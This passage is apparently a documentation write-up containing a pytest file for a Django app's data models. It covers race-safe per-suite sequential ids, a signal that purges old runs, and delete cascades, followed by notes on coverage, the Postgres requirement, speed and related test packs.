        second = run_factory(suite=suite)

        first.delete()

        third = run_factory(suite=suite)
        assert third.sequential_id == 3   # not 2


# =============================================================================
# Race condition — concurrent inserts into the same suite
# =============================================================================

@pytest.mark.skipif(
    'sqlite' in str(connection.settings_dict.get('ENGINE', '')),
    reason="select_for_update is a no-op on SQLite — this would pass for the wrong reason",
)
class TestRunSequentialIdRace:
    """data-model.md, "Per-suite sequential id": Run.save() must use
    select_for_update on the Suite row to keep the counter race-safe.

    This pack deliberately runs against real Postgres — Postgres's row-level
    locking is the actual mechanism we depend on. Mocking the lock would
    test our assumption about the lock, not the lock itself.
    """

    def test_five_concurrent_inserts_produce_five_distinct_ids(self, suite_factory):
        suite = suite_factory()
        results = []

        def worker():
            # Each thread uses its own DB connection — Django's test framework
            # gives us that automatically when threads make ORM calls.
            from django.db import connection as conn
            try:
                run = Run.objects.create(suite=suite)
                results.append(run.sequential_id)
            finally:
                conn.close()

        threads = [threading.Thread(target=worker) for _ in range(5)]
        for t in threads: t.start()
        for t in threads: t.join()

        assert sorted(results) == [1, 2, 3, 4, 5], (
            f"sequential_id collision under concurrency: got {sorted(results)}"
        )

    def test_high_contention_no_collisions(self, suite_factory):
        """20 concurrent inserts → 20 distinct ids. Run last; it stresses the lock."""
        suite = suite_factory()
        results = []

        def worker():
            from django.db import connection as conn
            try:
                run = Run.objects.create(suite=suite)
                results.append(run.sequential_id)
            finally:
                conn.close()

        threads = [threading.Thread(target=worker) for _ in range(20)]
        for t in threads: t.start()
        for t in threads: t.join()

        assert len(set(results)) == 20
        assert sorted(results) == list(range(1, 21))


# =============================================================================
# purge_old_runs signal — keeps the N most recent, cascades to tests
# =============================================================================

class TestPurgeOldRuns:
    """signals.py: post_save on Run, gated on `created=True`. Keeps
    settings.RUN_RETENTION_PER_SUITE most recent runs per suite, cascades
    to tests via on_delete=CASCADE.

    decisions.md #1: default 5, env-overridable.
    """

    def test_keeps_default_five_runs(self, suite_factory, run_factory, settings):
        settings.RUN_RETENTION_PER_SUITE = 5
        suite = suite_factory()
        for _ in range(8):
            run_factory(suite=suite)
        assert Run.objects.filter(suite=suite).count() == 5

    def test_keeps_the_five_most_recent(self, suite_factory, run_factory, settings):
        settings.RUN_RETENTION_PER_SUITE = 5
        suite = suite_factory()
        for _ in range(8):
            run_factory(suite=suite)
        seqs = list(
            Run.objects.filter(suite=suite).order_by('sequential_id')
                .values_list('sequential_id', flat=True)
        )
        assert seqs == [4, 5, 6, 7, 8]   # 1, 2, 3 purged

    def test_purge_cascades_to_tests(self, suite_factory, run_factory, test_factory, settings):
        settings.RUN_RETENTION_PER_SUITE = 1
        suite = suite_factory()
        run_a = run_factory(suite=suite)
        test_factory(run=run_a, name='will-be-purged')
        # Trigger the purge.
        run_factory(suite=suite)

        assert not Run.objects.filter(pk=run_a.pk).exists()
        assert not Test.objects.filter(name='will-be-purged').exists()

    def test_retention_setting_is_honoured(self, suite_factory, run_factory, settings):
        """Override the default and verify the signal reads from settings dynamically."""
        settings.RUN_RETENTION_PER_SUITE = 3
        suite = suite_factory()
        for _ in range(5):
            run_factory(suite=suite)
        assert Run.objects.filter(suite=suite).count() == 3

    def test_purge_does_not_cross_suite_boundaries(
        self, suite_factory, run_factory, settings,
    ):
        """A new run in suite A does NOT purge runs in suite B."""
        settings.RUN_RETENTION_PER_SUITE = 1
        a = suite_factory()
        b = suite_factory()
        run_factory(suite=b)   # this should survive
        for _ in range(3):
            run_factory(suite=a)

        assert Run.objects.filter(suite=a).count() == 1
        assert Run.objects.filter(suite=b).count() == 1   # untouched

    def test_signal_only_fires_on_create(self, suite_factory, run_factory, settings):
        """Updating a Run shouldn't trigger purge — the signal is gated on `created=True`."""
        settings.RUN_RETENTION_PER_SUITE = 5
        suite = suite_factory()
        runs = [run_factory(suite=suite) for _ in range(5)]

        # Touch the most recent run; if the signal fired on update, we'd see fewer than 5.
        runs[-1].save()

        assert Run.objects.filter(suite=suite).count() == 5


# =============================================================================
# Cascade behaviour — on_delete declarations
# =============================================================================

class TestCascades:
    """Verify the on_delete declarations from data-model.md actually behave as documented."""

    def test_deleting_project_removes_suites_runs_tests(
        self, project_factory, suite_factory, run_factory, test_factory,
    ):
        project = project_factory()
        suite   = suite_factory(project=project)
        run     = run_factory(suite=suite)
        test_factory(run=run)

        project.delete()

        assert Suite.objects.count() == 0
        assert Run.objects.count()   == 0
        assert Test.objects.count()  == 0

    def test_deleting_suite_removes_baselines(self, suite_factory):
        suite = suite_factory()
        Baseline.objects.create(
            suite=suite, name='X', browser='Chrome', size='1024', key='x-x-x',
        )
        suite.delete()
        assert Baseline.objects.count() == 0

    def test_deleting_test_does_not_delete_baseline(self, suite_factory, test_factory):
        """Baseline.test = on_delete=SET_NULL: deleting the originating Test
        leaves the Baseline intact (the screenshot is still valid).

        Different from Rails parity (legacy had no FK at all on this column),
        intentional improvement — see data-model.md "Full model implementation".
        """
        suite = suite_factory()
        test  = test_factory()
        baseline = Baseline.objects.create(
            suite=suite, name='X', browser='Chrome', size='1024', key='x', test=test,
        )

        test.delete()
        baseline.refresh_from_db()
        assert baseline.test_id is None
```

### What this pack covers

- **Slug auto-update** — both Project and Suite, on create and on rename, including the per-project uniqueness invariant.
- **`Test.key` formula** — basic case, re-save behaviour after a project rename, and a parametrize block covering whitespace/punctuation/Unicode handling.
- **Sequential IDs** — start at 1, increment per suite, monotonic across deletes, plus the high-contention concurrency test against real Postgres.
- **`purge_old_runs` signal** — default retention, "keeps N most recent" semantics, cascades to tests, doesn't cross suite boundaries, only fires on create.
- **Cascade declarations** — Project deletion wipes the tree, Suite deletion wipes baselines, Test deletion preserves the Baseline (`SET_NULL`).

### What it doesn't cover

- File handling on cascade delete — `FileField` cleanup on object delete is Django's job, and there's nothing custom in the model that depends on it.
- Default values for `Test.fuzz_level` / `highlight_colour` — covered by the field default declaration; testing a Django field default would be testing the framework.
- The `next_run_seq` column directly — its behaviour is fully observed via `sequential_id`. Asserting on the internal counter would couple the test to the implementation.

### Why the race tests run against real Postgres

`select_for_update` is a no-op on SQLite. A test that relies on it for correctness will pass on SQLite for the wrong reason — the row isn't locked, so the threads serialize via the GIL or by happenstance. Postgres is the real mechanism we depend on, and the `pytest.mark.skipif` block above ensures the suite skips (with a visible reason) rather than silently lying.

This is also why the conftest's `pytest.ini_options` should set `DATABASE_URL` to a real Postgres in CI. Local dev against SQLite is fine for everything else; the race-condition tests are the trip-wire.

### Speed

Pure DB. The race tests spin up 20 threads at peak; each opens a connection, inserts a row, closes. On a developer laptop the file runs in ~3–5 seconds. CI timing is dominated by Postgres startup, not by the tests themselves.

### How this pack relates to the others

- `test_screenshot_comparison.py` proves the diff service produces correct output.
- `test_serializers.py` proves the wire format hasn't drifted.
- `test_legacy_api.py` and `test_spa_api.py` prove the HTTP layer wires the diff and serializers correctly.
- `test_admin.py` proves the auth surface and the rename-warning UX.
- `test_models.py` (this file) proves the data layer's invariants — the foundation everything else stands on.

If `test_models.py` fails, the failure is upstream of any of the other packs. Run it first in CI; cheaper, narrower, and a model-layer regression makes everything else's failures redundant noise.
